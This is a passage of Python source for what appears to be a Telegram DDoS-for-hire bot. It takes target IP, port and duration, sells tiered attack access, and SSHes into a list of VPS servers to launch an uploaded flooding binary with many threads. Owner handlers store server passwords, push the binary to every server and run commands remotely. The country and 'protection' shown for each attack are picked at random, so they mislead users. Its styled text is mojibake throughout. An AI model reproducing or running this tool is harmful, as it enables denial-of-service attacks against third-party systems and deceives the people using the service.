        f"‚ö†Ô∏è ùóòùóªùòÅùó≤ùóø ùóÆùòÅùòÅùóÆùó∞ùó∏ ùó±ùó≤ùòÅùóÆùó∂ùóπùòÄ:\n\n"
        f"<ùó∂ùóΩ> <ùóΩùóºùóøùòÅ> <ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª>\n\n"
        f"{'üåü ùó©ùóúùó£ ùó£ùó•ùóúùó©ùóúùóüùóòùóöùóòùó¶' if is_vip else 'üîπ ùó°ùó¢ùó•ùó†ùóîùóü ùóîùóñùóñùóòùó¶ùó¶'}\n"
        f"‚Ä¢ ùó†ùóÆùòÖ ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª: {max_duration}ùòÄ\n"
        f"‚Ä¢ ùóßùóµùóøùó≤ùóÆùó±ùòÄ: {VIP_MAX_THREADS if is_vip else SPECIAL_MAX_THREADS if user_id in special_keys else MAX_THREADS}")
    bot.register_next_step_handler(message, process_attack_args)

def process_public_attack_args(message):
    """Process attack arguments for public mode with strict limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùó≥ùóºùóøùó∫ùóÆùòÅ! ùó®ùòÄùó≤: <ùó∂ùóΩ> <ùóΩùóºùóøùòÅ> <ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª>")
            
        ip, port, duration = args
        threads = 900  # Fixed thread count for public attacks
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùóΩùóºùóøùòÅ (ùü≠-ùü≤ùü±ùü±ùüØùü±)")
            
            # Enforce public attack limits strictly
            if duration > 120:
                raise ValueError("‚ùå ùó†ùóÆùòÖ ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª ùü≠ùüÆùü¨ùòÄ ùó≥ùóºùóø ùóΩùòÇùóØùóπùó∂ùó∞ ùóÆùòÅùòÅùóÆùó∞ùó∏ùòÄ")
                
            # Start attack with public limitations
            start_attack(message, ip, port, duration, threads, is_public=True)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        bot.reply_to(message, f"‚ùå ùóòùóøùóøùóºùóø: {str(e)}")

def process_attack_args(message):
    """Process attack arguments with strict enforcement of VIP/normal limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùó≥ùóºùóøùó∫ùóÆùòÅ! ùó®ùòÄùó≤: <ùó∂ùóΩ> <ùóΩùóºùóøùòÅ> <ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª>")
            
        ip, port, duration = args
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùóΩùóºùóøùòÅ (ùü≠-ùü≤ùü±ùü±ùüØùü±)")
            
            user_id = str(message.from_user.id)
            is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
            is_special = user_id in special_keys
            
            # Determine thread count based on user type
            if is_vip:
                threads = VIP_MAX_THREADS
                max_duration = VIP_MAX_DURATION
            elif is_special:
                threads = SPECIAL_MAX_THREADS
                max_duration = SPECIAL_MAX_DURATION
            else:
                threads = MAX_THREADS
                max_duration = MAX_DURATION
            
            if duration > max_duration:
                raise ValueError(f"‚ùå ùó†ùóÆùòÖ ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª {max_duration}ùòÄ {'(ùó©ùóúùó£)' if is_vip else '(ùó¶ùóΩùó≤ùó∞ùó∂ùóÆùóπ)' if is_special else ''}")
                
            # Start attack
            start_attack(message, ip, port, duration, threads)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        bot.reply_to(message, f"‚ùå ùóòùóøùóøùóºùóø: {str(e)}")

def execute_attack(vps, ip, port, duration, threads):
    """Execute attack command on a VPS with proper timeout"""
    ssh = None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
        
        # Use timeout command to ensure attack stops after duration
        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads}"
        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=10)
        exit_status = stdout.channel.recv_exit_status()
        
        # Timeout exits with status 124 - that's expected
        if exit_status not in [0, 124]:
            raise Exception(f"Attack failed with exit code {exit_status}")
        return True
    except Exception as e:
        raise Exception(f"Attack execution failed: {str(e)}")
    finally:
        if ssh:
            ssh.close()

def run_ssh_attack(vps, ip, port, duration, threads, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
    attack_id_vps = f"{attack_id}-{attack_num}"
    running_attacks[attack_id_vps] = {
        'user_id': user_id,
        'target_ip': ip,
        'start_time': time.time(),
        'duration': duration,
        'is_vip': is_vip,
        'vps_ip': vps[0],
        'is_public': is_public,
        'threads': threads,
        'completed': False,
        'message_sent': False  # Track if completion message was sent
    }
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
        
        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads} &"
        ssh.exec_command(cmd)
        
        start_time = time.time()
        last_update = 0
        
        while True:
            current_time = time.time()
            elapsed = current_time - start_time
            progress = min(100, int((elapsed / duration) * 100))
            
            if current_time - last_update >= 1:
                update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public)
                last_update = current_time
            
            if elapsed >= duration:
                break
                
            time.sleep(0.1)
        
        update_attack_status(chat_id, msg_id, ip, port, duration, threads, 100, country, flag, protection, is_vip, is_public)
        
        # Mark this attack as completed
        running_attacks[attack_id_vps]['completed'] = True
        
        # Check if we should send completion message
        target_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
        all_completed = all(running_attacks[aid]['completed'] for aid in target_attacks)
        
        if all_completed and not running_attacks[attack_id_vps]['message_sent']:
            # Mark all as having message sent to prevent duplicates
            for aid in target_attacks:
                running_attacks[aid]['message_sent'] = True
            
            attack_type = "üåê PUBLIC" if is_public else "üî• VIP" if is_vip else "‚ö° SPECIAL"
            completion_msg = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî {attack_type} ATTACK COMPLETED „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÇ
‚îÇ üéØ Target: {ip}:{port}
‚îÇ ‚è± Duration: {duration}s
‚îÇ üßµ Threads: {threads}
‚îÇ
‚îÇ {flag} {country}
‚îÇ üõ°Ô∏è Protection: {protection}
‚îÇ
‚îÇ ‚úÖ All attacks finished successfully!
‚îÇ
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
"""
            bot.send_message(chat_id, completion_msg)
            
    except Exception as e:
        error_msg = f"‚ùå ATTACK ERROR ({vps[0]})\n\n{flag} {country} | üõ°Ô∏è {protection}\nError: {str(e)}\n\nüéØ Target: {ip}:{port}\n‚ö†Ô∏è Attack interrupted"
        bot.send_message(chat_id, error_msg)
    finally:
        try:
            ssh.close()
        except:
            pass
        
        # Clean up if all attacks are done
        target_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
        if all(running_attacks[aid].get('message_sent', False) for aid in target_attacks):
            for aid in target_attacks:
                running_attacks.pop(aid, None)

def update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public):
    attack_type = "üåê PUBLIC" if is_public else "üî• VIP" if is_vip else "‚ö° SPECIAL"
    progress_bar = create_progress_bar(progress)
    elapsed_time = int(duration * (progress/100))
    remaining_time = max(0, duration - elapsed_time)
    
    status_msg = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî {attack_type} ATTACK „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÇ
‚îÇ üéØ Target: {ip}:{port}
‚îÇ ‚è± Duration: {duration}s (Elapsed: {elapsed_time}s)
‚îÇ üßµ Threads: {threads}
‚îÇ
‚îÇ {flag} {country}
‚îÇ üõ°Ô∏è Protection: {protection}
‚îÇ
‚îÇ {progress_bar}
‚îÇ {'‚ö° Running' if progress < 100 else '‚úÖ Completing...'}
‚îÇ
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
"""
    try:
        bot.edit_message_text(status_msg, chat_id, msg_id)
    except:
        pass

def start_attack(message, ip, port, duration, threads, is_public=False):
    user_id = str(message.from_user.id)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    
    vps_distribution = select_optimal_vps(VPS_LIST, threads)
    if not vps_distribution:
        bot.reply_to(message, "‚ùå No servers available! Try again later.")
        return
    
    attack_id = f"{ip}:{port}-{time.time()}"
    country, flag = random.choice([
        ("United States", "üá∫üá∏"), ("Germany", "üá©üá™"), ("Japan", "üáØüáµ"),
        ("Singapore", "üá∏üá¨"), ("Netherlands", "üá≥üá±"), ("France", "üá´üá∑")
    ])
    
    protection = random.choice([
        "Cloudflare Enterprise", "AWS Shield", "Google Armor",
        "Imperva Defense", "Akamai Prolexic", "Azure Protection"
    ])
    
    attack_type = "üåê PUBLIC" if is_public else "üî• VIP" if is_vip else "‚ö° SPECIAL"
    msg_text = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî {attack_type} ATTACK „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÇ
‚îÇ üéØ Target: {ip}:{port}
‚îÇ ‚è± Duration: {duration}s
‚îÇ üßµ Threads: {threads}
‚îÇ
‚îÇ {flag} {country}
‚îÇ üõ°Ô∏è Protection: {protection}
‚îÇ
‚îÇ {create_progress_bar(0)}
‚îÇ üîÑ Initializing attack...
‚îÇ
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
"""
    msg = bot.send_message(message.chat.id, msg_text)
    
    for i, (vps, vps_threads) in enumerate(vps_distribution):
        if vps_threads > 0:
            threading.Thread(
                target=run_ssh_attack,
                args=(vps, ip, port, duration, vps_threads, attack_id, i, 
                      message.chat.id, user_id, is_vip, msg.message_id, 
                      country, flag, protection, is_public),
                daemon=True
            ).start()
    
    global last_attack_time
    last_attack_time = time.time()

# ======================
# üñ•Ô∏è VPS MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "‚ûï ùòºùòøùòø ùôëùôãùôé")
def add_vps_start(message):
    """Start VPS addition process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùóÆùó±ùó± ùó©ùó£ùó¶!")
        return
    
    bot.reply_to(message,
        "‚ö†Ô∏è ùóòùóªùòÅùó≤ùóø ùó©ùó£ùó¶ ùó±ùó≤ùòÅùóÆùó∂ùóπùòÄ ùó∂ùóª ùó≥ùóºùóøùó∫ùóÆùòÅ:\n\n"
        "<ùó∂ùóΩ> <ùòÇùòÄùó≤ùóøùóªùóÆùó∫ùó≤> <ùóΩùóÆùòÄùòÄùòÑùóºùóøùó±>\n\n"
        "ùóòùòÖùóÆùó∫ùóΩùóπùó≤: ùü≠.ùü≠.ùü≠.ùü≠ ùóøùóºùóºùòÅ ùóΩùóÆùòÄùòÄùòÑùóºùóøùó±ùü≠ùüÆùüØ")
    bot.register_next_step_handler(message, add_vps_process)

def add_vps_process(message):
    """Process VPS addition with premium styling"""
    try:
        ip, username, password = message.text.split()

        # Try SSH connection before saving
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        ssh.close()

        VPS_LIST.append([ip, username, password])
        save_data()

        bot.reply_to(message,
            f"‚úÖ ùó©ùó£ùó¶ ùóÆùó±ùó±ùó≤ùó± ùòÄùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ!\n"
            f"ùóúùó£: `{ip}`\n"
            f"ùó®ùòÄùó≤ùóøùóªùóÆùó∫ùó≤: `{username}`",
            parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"‚ùå ùóòùóøùóøùóºùóø: {str(e)}\nùó©ùó£ùó¶ ùóªùóºùòÅ ùóÆùó±ùó±ùó≤ùó±. ùó£ùóπùó≤ùóÆùòÄùó≤ ùó∞ùóµùó≤ùó∞ùó∏ ùóúùó£/ùó®ùó¶ùóòùó•/ùó£ùóîùó¶ùó¶.")

@bot.message_handler(func=lambda msg: msg.text == "‚ûñ ùôçùôÄùôàùôäùôëùôÄ ùôëùôãùôé")
def remove_vps_start(message):
    """Start VPS removal process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùóøùó≤ùó∫ùóºùòÉùó≤ ùó©ùó£ùó¶!")
        return
    
    if not VPS_LIST:
        bot.reply_to(message, "‚ùå ùó°ùóº ùó©ùó£ùó¶ ùóÆùòÉùóÆùó∂ùóπùóÆùóØùóπùó≤ ùòÅùóº ùóøùó≤ùó∫ùóºùòÉùó≤!")
        return
    
    vps_list_text = "\n".join(f"{i+1}. ùóúùó£: {vps[0]}, ùó®ùòÄùó≤ùóø: {vps[1]}" for i, vps in enumerate(VPS_LIST))
    
    bot.reply_to(message,
        f"‚ö†Ô∏è ùó¶ùó≤ùóπùó≤ùó∞ùòÅ ùó©ùó£ùó¶ ùòÅùóº ùóøùó≤ùó∫ùóºùòÉùó≤ ùóØùòÜ ùóªùòÇùó∫ùóØùó≤ùóø:\n\n{vps_list_text}")
    bot.register_next_step_handler(message, remove_vps_process)

def remove_vps_process(message):
    """Process VPS removal with premium styling"""
    try:
        selection = int(message.text) - 1
        if 0 <= selection < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(selection)
            save_data()
            bot.reply_to(message,
                f"‚úÖ ùó©ùó£ùó¶ ùóøùó≤ùó∫ùóºùòÉùó≤ùó±!\n"
                f"ùóúùó£: {removed_vps[0]}\n"
                f"ùó®ùòÄùó≤ùóø: {removed_vps[1]}")
        else:
            bot.reply_to(message, "‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùòÄùó≤ùóπùó≤ùó∞ùòÅùó∂ùóºùóª!")
    except:
        bot.reply_to(message, "‚ùå ùó£ùóπùó≤ùóÆùòÄùó≤ ùó≤ùóªùòÅùó≤ùóø ùóÆ ùòÉùóÆùóπùó∂ùó± ùóªùòÇùó∫ùóØùó≤ùóø!")

@bot.message_handler(func=lambda msg: msg.text == "üì§ ùôêùôãùôáùôäùòºùòø ùòΩùôÑùôâùòºùôçùôî")
def upload_binary_start(message):
    """Initiate binary upload process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî ùóîùóñùóñùóòùó¶ùó¶ ùóóùóòùó°ùóúùóòùóó!\nùó¢ùó°ùóüùó¨ ùó¢ùó™ùó°ùóòùó•ùó¶ ùóñùóîùó° ùó®ùó£ùóüùó¢ùóîùóó ùóïùóúùó°ùóîùó•ùóúùóòùó¶.")
        return

    if not VPS_LIST:
        bot.reply_to(message, "‚ùå ùó°ùó¢ ùó©ùó£ùó¶ ùóñùó¢ùó°ùóôùóúùóöùó®ùó•ùóòùóó!")
        return

    bot.reply_to(message,
        "‚¨ÜÔ∏è ùó®ùó£ùóüùó¢ùóîùóó ùóïùóúùó°ùóîùó•ùó¨ ùóúùó°ùó¶ùóßùó•ùó®ùóñùóßùóúùó¢ùó°ùó¶\n\n"
        "ùü≠. ùó®ùóΩùóπùóºùóÆùó± ùòÜùóºùòÇùóø ùóØùó∂ùóªùóÆùóøùòÜ ùó≥ùó∂ùóπùó≤\n"
        "ùüÆ. ùó†ùòÇùòÄùòÅ ùóØùó≤ ùóªùóÆùó∫ùó≤ùó±: `pushpa`\n"
        "ùüØ. ùó™ùó∂ùóπùóπ ùóØùó≤ ùó∂ùóªùòÄùòÅùóÆùóπùóπùó≤ùó± ùòÅùóº: `/home/master/freeroot/root/`\n\n"
        "‚ö†Ô∏è ùó™ùóîùó•ùó°ùóúùó°ùóö: ùóßùóõùóúùó¶ ùó™ùóúùóüùóü ùó¢ùó©ùóòùó•ùó™ùó•ùóúùóßùóò ùóòùó´ùóúùó¶ùóßùóúùó°ùóö ùóïùóúùó°ùóîùó•ùóúùóòùó¶!",
        parse_mode="Markdown")
    
    bot.register_next_step_handler(message, handle_binary_upload)

def handle_binary_upload(message):
    """Process uploaded binary file with premium styling"""
    if not message.document:
        bot.reply_to(message, "‚ùå ùó°ùó¢ ùóôùóúùóüùóò ùóóùóòùóßùóòùóñùóßùóòùóó! ùó£ùóüùóòùóîùó¶ùóò ùó®ùó£ùóüùó¢ùóîùóó ùóî ùóïùóúùó°ùóîùó•ùó¨ ùóôùóúùóüùóò.")
        return

    file_name = message.document.file_name
    if file_name != BINARY_NAME:
        bot.reply_to(message, f"‚ùå ùóúùó°ùó©ùóîùóüùóúùóó ùóôùóúùóüùóò ùó°ùóîùó†ùóò! ùó†ùó®ùó¶ùóß ùóïùóò: `{BINARY_NAME}`")
        return

    # Download file temporarily
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    temp_path = f"/tmp/{file_name}"
    
    with open(temp_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    # Start distribution
    msg = bot.reply_to(message, "üîÑ ùóóùóúùó¶ùóßùó•ùóúùóïùó®ùóßùóúùó°ùóö ùóïùóúùó°ùóîùó•ùó¨ ùóßùó¢ ùóîùóüùóü ùó©ùó£ùó¶...")
    
    success_count = 0
    results = []
    
    for vps in VPS_LIST[:ACTIVE_VPS_COUNT]:  # Only active VPS
        ip, username, password = vps
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            with SCPClient(ssh.get_transport()) as scp:
                scp.put(temp_path, f"/home/master/freeroot/root/{BINARY_NAME}")
            
            # Make executable
            ssh.exec_command(f"chmod +x /home/master/freeroot/root/{BINARY_NAME}")
            
            # Verify
            stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/freeroot/root/{BINARY_NAME}")
            if BINARY_NAME in stdout.read().decode():
                results.append(f"‚úÖ {ip} - ùó¶ùòÇùó∞ùó∞ùó≤ùòÄùòÄ")
                success_count += 1
            else:
                results.append(f"‚ö†Ô∏è {ip} - ùó®ùóΩùóπùóºùóÆùó± ùó≥ùóÆùó∂ùóπùó≤ùó±")
            
            ssh.close()
        except Exception as e:
            results.append(f"‚ùå {ip} - ùóòùóøùóøùóºùóø: {str(e)}")

    # Cleanup and report
    os.remove(temp_path)
    
    bot.edit_message_text(
        f"üìä ùóïùóúùó°ùóîùó•ùó¨ ùóóùóúùó¶ùóßùó•ùóúùóïùó®ùóßùóúùó¢ùó° ùó•ùóòùó¶ùó®ùóüùóßùó¶:\n\n"
        f"‚Ä¢ ùó¶ùòÇùó∞ùó∞ùó≤ùòÄùòÄ: {success_count}/{len(VPS_LIST[:ACTIVE_VPS_COUNT])}\n"
        f"‚Ä¢ ùóôùóÆùó∂ùóπùó≤ùó±: {len(VPS_LIST[:ACTIVE_VPS_COUNT]) - success_count}\n\n"
        f"ùóóùóòùóßùóîùóúùóüùó¶:\n" + "\n".join(results),
        message.chat.id,
        msg.message_id,
        parse_mode="Markdown"
    )        

@bot.message_handler(func=lambda msg: msg.text == "üóëÔ∏è ùòøùôÄùôáùôÄùôèùôÄ ùòΩùôÑùôâùòºùôçùôî")
def delete_binary_all_vps(message):
    """Delete binary from all VPS servers with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî ùó¢ùó°ùóüùó¨ ùó¢ùó™ùó°ùóòùó•ùó¶ ùóñùóîùó° ùó®ùó¶ùóò ùóßùóõùóúùó¶ ùóñùó¢ùó†ùó†ùóîùó°ùóó!")
        return

    if not VPS_LIST:
        bot.reply_to(message, "‚ùå ùó°ùó¢ ùó©ùó£ùó¶ ùóñùó¢ùó°ùóôùóúùóöùó®ùó•ùóòùóó!")
        return

    msg = bot.reply_to(message, "‚è≥ ùóóùó≤ùóπùó≤ùòÅùó∂ùóªùó¥ ùóïùó∂ùóªùóÆùóøùòÜ ùó≥ùóøùóºùó∫ ùóîùóüùóü ùó©ùó£ùó¶...")

    success, failed, result_lines = 0, 0, []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)

            ssh.exec_command(f"rm -f /home/master/freeroot/root/{BINARY_NAME}")
            ssh.close()
            success += 1
            result_lines.append(f"‚úÖ `{ip}` - ùóïùó∂ùóªùóÆùóøùòÜ ùó±ùó≤ùóπùó≤ùòÅùó≤ùó±")
        except Exception as e:
            failed += 1
            result_lines.append(f"‚ùå `{ip}` - ùóòùóøùóøùóºùóø: `{str(e)}`")

    final_msg = (
        f"üóëÔ∏è *ùóïùóúùó°ùóîùó•ùó¨ ùóóùóòùóüùóòùóßùóúùó¢ùó° ùó•ùóòùó£ùó¢ùó•ùóß*\n\n"
        f"‚úÖ *ùó¶ùòÇùó∞ùó∞ùó≤ùòÄùòÄ:* {success}\n"
        f"‚ùå *ùóôùóÆùó∂ùóπùó≤ùó±:* {failed}\n\n"
        f"*ùóóùóòùóßùóîùóúùóüùó¶:*\n" + "\n".join(result_lines)
    )

    bot.edit_message_text(final_msg, message.chat.id, msg.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "‚ö° ùòΩùôäùôäùôéùôè ùôëùôãùôé (ùôéùòºùôÅùôÄ)")
def safe_boost_vps(message):
    """Boost VPS performance without deleting any files with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùóØùóºùóºùòÄùòÅ ùó©ùó£ùó¶!", reply_markup=create_main_keyboard(message))
        return

    # Send initial message with loading animation
    msg = bot.send_message(message.chat.id, "‚ö° ùóïùóºùóºùòÄùòÅùó∂ùóªùó¥ ùó©ùó£ùó¶ (ùó¶ùóÆùó≥ùó≤ ùó†ùóºùó±ùó≤)...")
    
    success = 0
    failed = 0
    optimization_details = []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            # SAFE OPTIMIZATION COMMANDS (NO FILE DELETION)
            commands = [
                # Clear RAM cache (safe)
                "sync; echo 3 > /proc/sys/vm/drop_caches",
                
                # Optimize SWAP
                "swapoff -a && swapon -a",
                
                # Clear DNS cache
                "systemctl restart systemd-resolved 2>/dev/null || service nscd restart 2>/dev/null",
                
                # Kill zombie processes
                "kill -9 $(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}') 2>/dev/null || true",
                
                # Network optimization
                "sysctl -w net.ipv4.tcp_fin_timeout=30",
                "sysctl -w net.ipv4.tcp_tw_reuse=1"
            ]
            
            # Execute all optimization commands
            for cmd in commands:
                ssh.exec_command(cmd)
            
            # Get before/after memory stats
            stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f%%\", $3*100/$2}'")
            mem_usage = stdout.read().decode().strip()
            
            optimization_details.append(f"‚úÖ {ip} - Memory: {mem_usage}")
            success += 1
            ssh.close()
            
        except Exception as e:
            failed += 1
            optimization_details.append(f"‚ùå {ip} - Error: {str(e)[:50]}...")
            continue

    # Prepare final report
    report = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî ‚ö° ùó©ùó£ùó¶ ùóïùó¢ùó¢ùó¶ùóß ùó•ùóòùó£ùó¢ùó•ùóß (ùó¶ùóîùóôùóò) „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÇ
‚îú üìä ùó¶ùòÅùóÆùòÅùòÄ: {success}‚úÖ | {failed}‚ùå
‚îÇ
‚îú ùó¢ùóΩùòÅùó∂ùó∫ùó∂ùòáùóÆùòÅùó∂ùóºùóªùòÄ ùóîùóΩùóΩùóπùó∂ùó≤ùó±:
‚îú ‚Ä¢ RAM Cache Cleared
‚îú ‚Ä¢ SWAP Memory Optimized  
‚îú ‚Ä¢ DNS Cache Flushed
‚îú ‚Ä¢ Zombie Processes Killed
‚îú ‚Ä¢ Network Stack Tuned
‚îÇ
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

üìù ùóóùó≤ùòÅùóÆùó∂ùóπùó≤ùó± ùó•ùó≤ùòÄùòÇùóπùòÅùòÄ:
""" + "\n".join(optimization_details)

    # Edit the original message with final report
    try:
        if len(report) > 4000:
            # Split long messages
            part1 = report[:4000]
            part2 = report[4000:]
            bot.edit_message_text(part1, message.chat.id, msg.message_id)
            bot.send_message(message.chat.id, part2)
        else:
            bot.edit_message_text(report, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, report)

# ======================
# üì¢ BROADCAST SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "üì¢ ùòΩùôçùôäùòøùòæùòºùôéùôè")
def send_notice_handler(message):
    """Handle broadcast message initiation with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "üö´ ùóîùóñùóñùóòùó¶ùó¶ ùóóùóòùó°ùóúùóòùóó", reply_markup=create_main_keyboard(message))
        return

    msg = bot.send_message(message.chat.id, 
        "üì¢ ùó¶ùóòùó°ùóó ùó¨ùó¢ùó®ùó• ùó°ùó¢ùóßùóúùóñùóò (ùóîùó°ùó¨ ùó¢ùóô ùóßùóõùóòùó¶ùóò):\n"
        "‚Ä¢ ùóßùó≤ùòÖùòÅ ùó∫ùó≤ùòÄùòÄùóÆùó¥ùó≤\n"
        "‚Ä¢ ùó£ùóµùóºùòÅùóº ùòÑùó∂ùòÅùóµ ùó∞ùóÆùóΩùòÅùó∂ùóºùóª\n" 
        "‚Ä¢ ùó©ùó∂ùó±ùó≤ùóº ùòÑùó∂ùòÅùóµ ùó∞ùóÆùóΩùòÅùó∂ùóºùóª\n"
        "‚Ä¢ ùóôùó∂ùóπùó≤/ùó±ùóºùó∞ùòÇùó∫ùó≤ùóªùòÅ ùòÑùó∂ùòÅùóµ ùó∞ùóÆùóΩùòÅùó∂ùóºùóª")
    bot.register_next_step_handler(msg, capture_notice_message)

def capture_notice_message(message):
    """Capture the broadcast message content with premium styling"""
    if message.content_type not in ['text', 'photo', 'video', 'document']:
        bot.reply_to(message, "‚ö†Ô∏è ùó£ùóüùóòùóîùó¶ùóò ùó¶ùóòùó°ùóó ùó¢ùó°ùóüùó¨:\nùóßùó≤ùòÖùòÅ/ùó£ùóµùóºùòÅùóº/ùó©ùó∂ùó±ùó≤ùóº/ùóôùó∂ùóπùó≤")
        return

    notice = {
        "type": message.content_type,
        "content": message.text if message.content_type == 'text' else message.caption,
        "sender": message.from_user.id
    }

    # Handle different attachment types
    if message.content_type == 'photo':
        notice['file_id'] = message.photo[-1].file_id
    elif message.content_type == 'video':
        notice['file_id'] = message.video.file_id
    elif message.content_type == 'document':
        notice['file_id'] = message.document.file_id
        notice['file_name'] = message.document.file_name

    instructor_notices[str(message.from_user.id)] = notice

    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("‚úÖ ùóïùó•ùó¢ùóîùóóùóñùóîùó¶ùóß ùó°ùó¢ùó™", callback_data="broadcast_now"),
        telebot.types.InlineKeyboardButton("‚ùå ùóñùóîùó°ùóñùóòùóü", callback_data="cancel_notice")
    )

    # Create premium preview message
    preview_text = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî üì¢ ùó°ùó¢ùóßùóúùóñùóò ùó£ùó•ùóòùó©ùóúùóòùó™ „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÉ
